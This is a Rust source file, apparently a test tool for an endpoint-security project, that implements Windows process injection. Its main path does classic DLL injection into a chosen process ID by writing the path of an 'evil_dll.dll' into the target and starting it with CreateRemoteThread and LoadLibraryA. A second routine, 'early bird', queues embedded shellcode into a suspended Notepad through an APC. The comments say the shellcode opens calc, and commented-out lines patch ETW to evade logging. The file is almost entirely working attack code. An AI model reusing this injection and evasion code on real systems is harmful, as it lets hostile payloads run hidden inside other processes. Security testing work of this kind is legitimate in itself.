use std::{arch::asm, ffi::c_void, mem, ptr::null_mut, thread::sleep, time::Duration};

use clap::Parser;
use patch_etw::patch_etw;
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{
                GetProcessHeap, HEAP_ZERO_MEMORY, HeapAlloc, MEM_COMMIT, MEM_RESERVE,
                PAGE_EXECUTE_READWRITE, VirtualAllocEx,
            },
            Threading::{
                CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessA, CreateRemoteThread,
                DeleteProcThreadAttributeList, EXTENDED_STARTUPINFO_PRESENT,
                InitializeProcThreadAttributeList, LPPROC_THREAD_ATTRIBUTE_LIST, OpenProcess,
                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROCESS_ALL_ACCESS, PROCESS_INFORMATION,
                QueueUserAPC, ResumeThread, STARTUPINFOEXA, STARTUPINFOW_FLAGS,
                UpdateProcThreadAttribute,
            },
        },
    },
    core::{PSTR, s},
};

use crate::direct_syscalls::open_process;

mod direct_syscalls;
mod patch_etw;

#[derive(Parser)]
struct Cli {
    #[arg(long)]
    pid: u32,
}

fn main() {
    sleep(Duration::from_secs(1));

    // patch ETW
    // println!("[i] About to patch etw...");
    // patch_etw();
    // println!("[+] ETW Patched... >:D");

    // Do process injection
    println!("Doing straight up virgin process injection..");
    virgin_process_injection();

    // Early bird process injection
    // early_bird();
}

fn early_bird() {
    unsafe {
        let mut pi = PROCESS_INFORMATION::default();
        let mut si = STARTUPINFOEXA::default();
        si.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as _;
        si.StartupInfo.dwFlags = STARTUPINFOW_FLAGS(EXTENDED_STARTUPINFO_PRESENT.0);
        let mut attr_size: usize = 0;

        let _ = InitializeProcThreadAttributeList(
            Some(LPPROC_THREAD_ATTRIBUTE_LIST(null_mut())),
            1,
            Some(0),
            &mut attr_size,
        );

        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(HeapAlloc(
            GetProcessHeap().unwrap(),
            HEAP_ZERO_MEMORY,
            attr_size,
        ));

        let _ = InitializeProcThreadAttributeList(Some(attr_list), 1, None, &mut attr_size);
        let policy = 0x00000001u64 << 44;

        let _ = UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            Some(&policy as *const _ as *const c_void),
            std::mem::size_of::<u64>(),
            None,
            None,
        );
        si.lpAttributeList = attr_list;

        let _process = CreateProcessA(
            None,
            Some(PSTR(s!(r"C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2501.31.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe").as_ptr() as *mut u8)), // File path
            // Some(PSTR(s!(r"explorer.exe").as_ptr() as *mut u8)), // File path
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            None,
            None,
            &si.StartupInfo,
            &mut pi,
        ).unwrap_or_else(|e| {
            panic!("[!] CreateProcessA Failed With Error: {e}");
        });
        DeleteProcThreadAttributeList(attr_list);

        // Opens calc when a thread becomes alertable :)
        let shellcode = [
            0xebu8, 0x4e, 0x00, 0x00, 0xa3, 0x11, 0x00, 0x00, 0xa4, 0x11, 0x00, 0x00, 0x4b, 0x00,
            0x45, 0x00, 0x52, 0x00, 0x4e, 0x00, 0x45, 0x00, 0x4c, 0x00, 0x33, 0x00, 0x32, 0x00,
            0x2e, 0x00, 0x44, 0x00, 0x4c, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x45,
            0x78, 0x65, 0x63, 0x00, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00,
            0x18, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x56, 0x56, 0x57,
            0x55, 0x53, 0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00,
            0x00, 0x00, 0x65, 0x48, 0x8b, 0x0c, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x51,
            0x18, 0x48, 0x8b, 0x42, 0x10, 0x48, 0x8d, 0x15, 0x90, 0xff, 0xff, 0xff, 0x48, 0x89,
            0xc1, 0x4c, 0x8b, 0x41, 0x60, 0x4d, 0x85, 0xc0, 0x74, 0x3d, 0x66, 0x83, 0x79, 0x58,
            0x00, 0x74, 0x36, 0x49, 0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff, 0x66, 0x43, 0x83, 0x7c,
            0x48, 0x02, 0x00, 0x4d, 0x8d, 0x49, 0x01, 0x75, 0xf3, 0x49, 0x83, 0xf9, 0x0c, 0x75,
            0x1c, 0x45, 0x31, 0xc9, 0x49, 0x83, 0xf9, 0x18, 0x74, 0x22, 0x45, 0x0f, 0xb7, 0x14,
            0x11, 0x4d, 0x8d, 0x59, 0x02, 0x66, 0x47, 0x3b, 0x14, 0x08, 0x4d, 0x89, 0xd9, 0x74,
            0xe7, 0x48, 0x8b, 0x09, 0x48, 0x39, 0xc1, 0x75, 0xb2, 0xb8, 0x78, 0x56, 0x34, 0x12,
            0xeb, 0x04, 0x48, 0x8b, 0x41, 0x30, 0x41, 0xb8, 0x21, 0x43, 0x65, 0x87, 0x66, 0x81,
            0x38, 0x4d, 0x5a, 0x0f, 0x85, 0x9d, 0x00, 0x00, 0x00, 0x8b, 0x48, 0x3c, 0x44, 0x8b,
            0x84, 0x08, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8b, 0x54, 0x00, 0x18, 0x42, 0x8b, 0x4c,
            0x00, 0x1c, 0x46, 0x8b, 0x4c, 0x00, 0x20, 0x46, 0x8b, 0x44, 0x00, 0x24, 0x31, 0xdb,
            0x4c, 0x8d, 0x15, 0x15, 0xff, 0xff, 0xff, 0x48, 0x39, 0xd3, 0x0f, 0x84, 0x81, 0x00,
            0x00, 0x00, 0x48, 0x8d, 0x73, 0x01, 0x41, 0x89, 0xdb, 0x43, 0x8d, 0x3c, 0x99, 0x8b,
            0x3c, 0x38, 0x80, 0x3c, 0x38, 0x00, 0x48, 0x89, 0xf3, 0x74, 0xe0, 0x48, 0x01, 0xc7,
            0x49, 0xc7, 0xc6, 0xff, 0xff, 0xff, 0xff, 0x42, 0x80, 0x7c, 0x37, 0x01, 0x00, 0x4d,
            0x8d, 0x76, 0x01, 0x75, 0xf4, 0x48, 0x89, 0xf3, 0x49, 0x83, 0xfe, 0x07, 0x75, 0xc1,
            0x31, 0xdb, 0x48, 0x83, 0xfb, 0x07, 0x74, 0x16, 0x42, 0x8a, 0x2c, 0x13, 0x4c, 0x8d,
            0x73, 0x01, 0x40, 0x3a, 0x2c, 0x1f, 0x4c, 0x89, 0xf3, 0x74, 0xe9, 0x48, 0x89, 0xf3,
            0xeb, 0xa3, 0x43, 0x8d, 0x14, 0x58, 0x0f, 0xb7, 0x14, 0x10, 0x81, 0xe2, 0xff, 0x3f,
            0x00, 0x00, 0x8d, 0x0c, 0x91, 0x44, 0x8b, 0x04, 0x08, 0x49, 0x01, 0xc0, 0x48, 0x8d,
            0x0d, 0xa1, 0xfe, 0xff, 0xff, 0xba, 0x01, 0x00, 0x00, 0x00, 0x5b, 0x5d, 0x5f, 0x5e,
            0x41, 0x5e, 0x49, 0xff, 0xe0, 0x41, 0xb8, 0x44, 0x33, 0x22, 0x11, 0xeb, 0xe3, 0xcc,
            0x01, 0x06, 0x05, 0x00, 0x06, 0x30, 0x05, 0x50, 0x04, 0x70, 0x03, 0x60, 0x02, 0xe0,
        ];
        let allocated_vaddr = VirtualAllocEx(
            pi.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        let buff_result = WriteProcessMemory(
            pi.hProcess,
            allocated_vaddr,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            None,
        );

        let p_thread_start_routine: Option<unsafe extern "system" fn(usize)> =
            mem::transmute(allocated_vaddr);

        let res = QueueUserAPC(p_thread_start_routine, pi.hThread, 0);
        if res == 0 {
            panic!("Failed to run QueueUserAPC. GLE: {}", GetLastError().0);
        }

        ResumeThread(pi.hThread);

        println!(
            "Process started, pid: {}. Alloc: {:p}",
            pi.dwProcessId, allocated_vaddr
        );
    }
}

fn virgin_process_injection() {
    let args = Cli::parse();
    println!("Attempting to open process: {}", args.pid);
    let handle = open_process(args.pid);

    let handle = if handle.is_ok() {
        handle.unwrap()
    } else {
        panic!("Did not get handle. Last error: {:#X}", unsafe {
            GetLastError().0
        });
    };

    // ALLOCATE MEMORY FOR OUR ADDRESS
    let path_to_dll = "C:\\Users\\flux\\Desktop\\sanctum\\evil_dll.dll\0";

    let allocated_vaddr = unsafe {
        VirtualAllocEx(
            handle,
            None,
            size_of_val(path_to_dll),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if allocated_vaddr.is_null() {
        panic!("[-] Did not allocate memory in target process");
    } else {
        println!("[+] Allocated at address: {:p}", allocated_vaddr);
    }

    // Write to the buffer
    let mut bytes_written: usize = 0;
    let buff_result = unsafe {
        WriteProcessMemory(
            handle,
            allocated_vaddr,
            path_to_dll.as_ptr() as *const c_void,
            size_of_val(path_to_dll),
            Some(&mut bytes_written as *mut usize),
        )
    };

    match buff_result {
        Ok(_) => println!("[+] Bytes written to remote process: {:?}", bytes_written),
        Err(e) => panic!("[-] Error writing remote process memory: {e}"),
    }

    let h_kernel32 = unsafe { GetModuleHandleA(s!("Kernel32.dll")) };
    let h_kernel32 = match h_kernel32 {
        Ok(h) => {
            println!("[+] Handle to Kernel32.dll: {:?}", h);
            h
        }
        Err(e) => panic!("[-] Could not get handle to Kernel32.dll, {e}"),
    };
    // GET FUNCTION POINTER TO LOAD LIBRARY
    let load_library_fn_address = unsafe { GetProcAddress(h_kernel32, s!("LoadLibraryA")) };
    let load_library_fn_address = match load_library_fn_address {
        None => panic!("[-] Could not resolve the address of LoadLibraryA."),
        Some(address) => {
            let address = address as *const (); // better cast as per https://doc.rust-lang.org/std/mem/fn.transmute.html
            println!("[+] Address of LoadLibraryA: {:p}", address);
            address
        }
    };
    // correctly cast the address of LoadLibraryA
    let load_library_fn_address: Option<unsafe extern "system" fn(*mut c_void) -> u32> =
        Some(unsafe { std::mem::transmute(load_library_fn_address) });

    let mut thread: u32 = 0;

    // create thread
    let h_thread = unsafe {
        CreateRemoteThread(
            handle,
            None, // default security descriptor
            0,    // default stack size
            load_library_fn_address,
            Some(allocated_vaddr),
            0,
            Some(&mut thread as *mut u32),
        )
    };

    match h_thread {
        Ok(h) => println!("[+] Thread started, handle: {:?}", h),
        Err(e) => panic!("[-] Error occurred creating thread: {e}"),
    }

    let _ = unsafe { CloseHandle(handle) };
}
